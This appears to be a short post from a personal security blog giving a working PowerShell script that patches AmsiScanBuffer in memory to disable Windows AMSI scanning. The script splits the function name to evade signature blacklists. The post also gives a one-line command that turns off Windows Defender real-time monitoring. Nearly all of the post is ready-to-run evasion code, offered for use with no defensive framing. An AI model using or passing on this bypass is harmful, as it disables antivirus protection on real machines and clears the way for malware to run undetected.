<!doctype html><html lang=en><head><title>Bypassing Windows Defender and AMSI 2019 | wooper blog</title>
<meta name=description content="How to bypass Windows Defender and AMSI using a powershell script."><link rel=icon type=image/x-icon href=/images/sk8r-wooper.png><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w==" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous><link rel=stylesheet href=https://blog.kazam.io/css/colour/wooper.css><link rel=stylesheet href=https://blog.kazam.io/css/colour/wooper-mode.css><link rel=stylesheet href=https://blog.kazam.io/css/risotto.css><link rel=stylesheet href=https://blog.kazam.io/css/custom.css></head><body><div class=page><header class=page__header><h1 class=page__logo><a href=https://blog.kazam.io class=page__logo-inner>wooper blog</a></h1><nav class="page__nav main-nav"><ul><li class=main-nav__item><a class=nav-main-item href=/about/ title>About</a></li><li class=main-nav__item><a class=nav-main-item href=/notes/ title=Notes>Notes</a></li><li class=main-nav__item><a class="nav-main-item active" href=/posts/ title=Posts>Posts</a></li></ul></nav></header><section class=page__body><header class=content__header><h1>Bypassing Windows Defender and AMSI 2019</h1></header><div class=content__body><p>These steps assume you have access to powershell with admin rights. For the record, I’m not sure if this will work on a domain joined machine where conflicting policies may have been set. The AMSI script works by patching the AMSI DLL in memory, which means it’s not persistent and does not require privileges. The Defender command changes a registry value, which means it is persistend and it also requires privileges.</p><p>Disable AMSI</p><p><code>$win32 = @"</code><br><code>using System.Runtime.InteropServices;</code><br><code>using System;</code><br><code>public class Win32 {</code><br><code>[DllImport("kernel32")]</code><br><code>public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</code><br><code>[DllImport("kernel32")]</code><br><code>public static extern IntPtr LoadLibrary(string name);</code><br><code>[DllImport("kernel32")]</code><br><code>public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect</code><br><code>);</code><br><code>}</code><br><code>"@</code><br><code>Add-Type $win32</code><br><code># String Concatenation to bypass blacklist</code><br><code>$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScan"+"Buffer")</code><br><code>$b = 0</code><br><code>[Win32]::VirtualProtect($ptr, [UInt32]5, 0x40, [Ref]$b)</code><br><code>$buf = New-Object Byte[] 7</code><br><code>$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00;</code><br><code>[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)</code></p><p>Credit to <a href=https://web.archive.org/web/20220520135811/https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/>Avi Gimpel</a>, the exact code in his blog post no longer works because it contains “AmsiScanBuffer” but with a little concatenation it still works great!</p><p>Disable Defender</p><p><code>PowerShell Set-MpPreference -DisableRealtimeMonitoring 1</code></p><p>Credit to <a href=https://web.archive.org/web/20220520135811/https://www.tenforums.com/tutorials/3569-turn-off-windows-defender-real-time-protection-windows-10-a.html#option5>Shawn Brink</a></p></div><footer class=content__footer></footer></section><section class=page__aside><div class=aside__about><div class=aside__about><img class=about__logo src=https://blog.kazam.io/images/sk8r-wooper.png alt=Logo><h1 class=about__title>wooper blog</h1><p class=about__description>very serious intellectual thoughts /s</p></div><ul class=aside__social-links><li><a href=https://github.com/evillogic rel=me aria-label=GitHub title=GitHub><i class="fab fa-github" aria-hidden=true></i></a>&nbsp;</li><li><a href=mailto:evillogic1@gmail.com rel=me aria-label=Email title=Email><i class="fas fa-envelope" aria-hidden=true></i></a>&nbsp;</li><li><a href=#ZgotmplZ rel=me aria-label="Happy Hacking!" title="Happy Hacking!"><i class="ai ai-arxiv" aria-hidden=true></i></a>&nbsp;</li></ul></div><hr><div class=aside__content><p>How to bypass Windows Defender and AMSI using a powershell script.</p><p>2019-09-23</p></div></section><footer class=page__footer><p class=copyright>© 2024 Kaz Bishop</p><p class=advertisement>Powered by <a href=https://gohugo.io/>hugo</a> and <a href=https://github.com/joeroe/risotto>risotto</a>.</p><script defer language=javascript type=text/javascript src=/js/copy.js></script></footer></div></body></html>